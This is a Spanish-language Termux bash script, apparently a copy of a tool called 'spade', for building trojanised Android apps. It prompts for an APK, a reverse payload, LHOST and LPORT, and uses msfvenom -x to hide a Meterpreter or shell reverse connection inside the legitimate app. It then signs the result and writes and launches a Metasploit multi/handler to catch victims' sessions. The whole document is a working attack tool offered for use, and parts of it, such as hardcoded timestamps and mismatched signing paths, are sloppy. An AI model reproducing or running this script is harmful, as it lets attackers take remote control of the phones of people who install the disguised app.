#! /data/data/com.termux/files/usr/bin/bash
echo
R='\033[1;31m'                                                          G='\033[1;32m'                                                          Y='\033[1;33m'                                                          B='\033[1;34m'                                                          M='\033[1;35m'                                                          C='\033[1;36m'                                                          W='\033[0m'
	Cesar_Hacker=$HOME/spade
echo $(clear)
printf "$W"
echo " _______  _______  _______  ______   _______                            |       ||       ||   _   ||      | |       |"
echo "|  _____||    _  ||  |_|  ||  _    ||    ___|"
echo "| |_____ |   |_| ||       || | |   ||   |___                            |_____  ||    ___||       || |_|   ||    ___|"
echo " _____| ||   |    |   _   ||       ||   |___"
echo "|_______||___|    |__| |__||______| |_______|"
setterm -foreground yellow
echo "                               Creado por (Cesar Hack Gray)"
echo
echo -e "$B[*] $W Started spade at 10:20:17"
echo -e "$Y[!] $W Argument missing"
echo -e "$B[*] $W Usage %s <apk-to-embed>"
echo
printf "python2 "
    while read -p "spade.py " APK && [ -z $APK ]; do
	    printf "\n $W
	    escribe la ruta de la apk
	    $W \n"
    done
		if [ ! -e $APK ]; then
			printf " [Gray error tu apk no existe
				$W \n"
				sleep 2
				bash $HOME/spade/spade.py
			fi
			echo $(clear)
echo " _______  _______  _______  ______   _______"
echo "|       ||       ||   _   ||      | |       |"
echo "|  _____||    _  ||  |_|  ||  _    ||    ___|"
echo "| |_____ |   |_| ||       || | |   ||   |___"
echo "|_____  ||    ___||       || |_|   ||    ___|"
echo " _____| ||   |    |   _   ||       ||   |___"
echo "|_______||___|    |__| |__||______| |_______|"
setterm -foreground yellow
echo "                               Creado por (Cesar Hack Gray)"

echo -e "$B [*] $W Started spade at 10:29:46"
echo -e "$B [*] $W Check file $APK"
echo -e "$G [+] $W File $APK OK"
echo -e "$W PAYLOADS"
echo "[1] android/meterpreter/reverse_http"
echo "[2] android/meterpreter/reverse_https"
echo "[3] android/meterpreter/reverse_tcp"
echo "[4] android/shell/reverse_http"
echo "[5] android/shell/reverse_https"
echo "[6] android/shell/reverse_tcp"
printf "Payload"
	while read -p "> " PAYLOAD && [ -z $PAYLOAD ]; do
		printf "\n $W
		Payload invalido
		$W \n"
	done
printf "LHOST"
	while read -p "> " LHOST && [ -z $LHOST ]; do
		printf "\n $W
		LHOST invalido
		$W \n"
	done
printf "LPORT"
	while read -p "> " LPORT && [ -z $LPORT ]; do
		printf "\n $W
		LPORT invalido
		$W \n"
	done

printf "Name"
	while read -p "> " Cesar && [ -z $Cesar ]; do
		printf "\n $W
		Nombre invalido
		$W \n"
		
	done

	if [ $PAYLOAD -eq '1' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '2' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '3' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '4' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/shell/reverse_http LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '5' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/shell/reverse_https LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '6' ]; then

printf "$B [*] $W Generating payload...\n"
msfvenom -x $APK -p android/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT

fi
echo -e "$B[*] $W Firmando Payload "
apksigner -p Cesar keystore $Cesar_Hacker/Injecting/output.apk $Cesar_Hacker/CesarHack/$Cesar-final.apk
echo
echo $(clear)
echo
echo
while read -p "Inisiamos metasploit con la comfigurasion [y|n] >> " Gray && [ -z $Gray ]; do
	printf "\n $R
	[Gray] porfavor nesesitamos una respuesta
	$W \n"
done
	if [ $Gray = 'y' -o $Gray = 'Y' ] ; then

		if [ $PAYLOAD -eq '1' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/meterpreter/reverse_http" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc


	elif [ $PAYLOAD -eq '2' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/meterpreter/reverse_https" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc

	elif [ $PAYLOAD -eq '3' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/meterpreter/reverse_tcp" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc

	elif [ $PAYLOAD -eq '4' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/shell/reverse_http" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc

	elif [ $PAYLOAD -eq '5' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/shell/reverse_https" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc

	elif [ $PAYLOAD -eq '6' ]; then
echo
printf "msfconsole...\n"
touch $Cesar_Hacker/msf/$Cesar.rc
echo "use exploit/multi/handler" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set PAYLOAD android/shell/reverse_tcp" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LHOST $LHOST" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set LPORT $LPORT" >> $Cesar_Hacker/msf/$Cesar.rc
echo "set ExitOnSession false" >> $Cesar_Hacker/msf/$Cesar.rc
echo "exploit -j" >> $Cesar_Hacker/msf/$Cesar.rc
chmod 777 $Cesar_Hacker/msf/$Cesar.rc

msfconsole -q -r $Cesar_Hacker/msf/$Cesar.rc

	fi
else
echo
echo
cd $HOME/metasploit-framework
./msfconsole

fi




